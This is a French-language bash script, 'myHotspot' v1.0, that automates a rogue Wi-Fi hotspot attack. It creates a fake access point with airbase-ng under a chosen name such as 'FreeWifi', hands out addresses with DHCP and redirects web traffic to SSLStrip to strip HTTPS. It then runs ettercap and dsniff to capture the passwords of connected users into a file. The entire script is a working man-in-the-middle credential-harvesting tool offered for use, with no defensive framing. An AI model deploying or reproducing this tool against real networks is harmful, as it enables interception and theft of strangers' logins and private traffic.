#!/bin/bash
# Copyright 2015 - Nyzo
# myHotspot - version 1.0

if [ "$1" == "kill" ];then
echo
echo "[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."

pkill airbase-ng
echo "[+] Airbase-ng (fake ap) stoppé"
pkill dhcpd
echo "[+] DHCP stoppé"
killall python
echo "[+] SSLStrip et SSLStrip Log stoppés"
pkill ettercap
echo "[+] Ettercap stoppé"
pkill dsniff
echo "[+] Dsniff stoppé"
sleep 2

echo "[+] Airmon-ng stoppé"
sleep 2
echo
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "[+] iptables restaurée"
sleep 2
airmon-ng stop mon0
sleep 1
echo
ifconfig wlan0 up
ifconfig wlan1 up
ifconfig eth0 up
# Ajouter-en d'autres si vous le souhaitez
/etc/init.d/networking stop && /etc/init.d/networking start
echo "[+] Redémarrage du système internet"

echo "[+] Nettoyage et restauration terminé !"
echo "[+] Merci d'utiliser myHotspot et à bientôt !"
sleep 6
clear

exit
else

# Initialisation
echo
echo " - myHotspot - Version 1.0  - Par Nyzo - "
echo
route -n -A inet | grep UG
echo
echo
echo "Entrez l'IP connectée à un réseau, listée ci-dessus :"
read -e gatewayip
echo -n "Entrez l'interface connectée à un réseau, listée ci-dessus. Sélectionnez l'interface associée à l'IP précédemment choisie : "
read -e internet_interface
echo -n "Entrez l'interface que vous souhaitez utiliser pour créer le point d'accès wifi. L'interface ne doit pas être connectée à internet :"
read -e fakeap_interface
echo -n "Entrez le nom que vous souhaitez donner au point d'accès wifi (Ex: FreeWifi) :"
read -e ESSID
airmon-ng start $fakeap_interface
fakeap=$fakeap_interface
fakeap_interface="mon0"

# Création de la configuration DHCPD
mkdir -p "/pentest/wireless/myhotspot"
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"$ESSID\"";
option domain-name-servers 10.0.0.1;

range 10.0.0.20 10.0.0.50;

}" > /pentest/wireless/myhotspot/dhcpd.conf

# Création du point d'accès wifi
echo "[+] Configuration du point d'accès wifi"
xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & fakeapid=$!
disown
sleep 3

# Tables
echo "[+] Configurations des tables et des redirections"
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 3

# DHCP
echo "[+] Configuration et démarrage DHCP"
chmod 777 /var/run/
touch /var/run/dhcpd.pid
chmod 777 /var/run/dhcpd.pid
chown dhcpd:dhcpd /var/run/dhcpd.pid
xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dchpid=$!
disown
sleep 3

# Sslstrip
echo "[+] Configuration et démarrage de SSLStrip"
xterm -geometry 75x15+1+200 -T SSLStrip -e sslstrip -f -p -k 10000 & sslstripid=$!
sleep 3

# Ettercap
echo "[+] Configuration et démarrage de Ettercap"
xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/myhotspot/passwords -i at0 & ettercapid=$!
disown
sleep 3

#SSLStrip Log
echo "[+] Configuration et démarrage de SSLStrip Log"
xterm -geometry 75x15+1+600 -T "SSLStrip Log" -e tail -f sslstrip.log & sslstriplogid=$!
sleep 3

#SSLStrip Log
echo "[+] Configuration et démarrage de Dsniff [beta]"
xterm -xrm '*hold: true' -geometry 75x15+1+600 -T "Dsniff" -e dsniff -i at0 & dsniffid=$!
disown
sleep 3

clear
echo "[+] Initialistion terminée"
echo
echo "Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
echo "IMPORTANT : Pressez Y pour quitter, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. Si vous n'avez pas quitter correctement, tapez ./myhotspot.sh kill"
read STOP

# Nettoyage
if [ $STOP = "y" ] ; then
echo
echo "[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."

kill ${fakeapid}
echo "[+] Airbase-ng (fake ap) stoppé"
kill ${dchpid}
echo "[+] DHCP stoppé"
kill ${sslstripid}
echo "[+] SSLStrip stoppé"
kill ${ettercapid}
echo "[+] Ettercap stoppé"
kill ${sslstriplogid}
echo "[+] SSLStrip log stoppé"
kill ${dsniffid}
echo "[+] Dsniff stoppé"
sleep 2

echo "[+] Airmon-ng stoppé"
sleep 2
echo
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "[+] iptables restaurée"
sleep 2
airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
sleep 1
echo
ifconfig $internet_interface up
/etc/init.d/networking stop && /etc/init.d/networking start
echo "[+] Redémarrage du système internet"

echo "[+] Nettoyage et restauration terminé !"
echo "[+] Merci d'utiliser myHotspot et à bientôt !"
sleep 6
clear
fi
exit

fi

exit
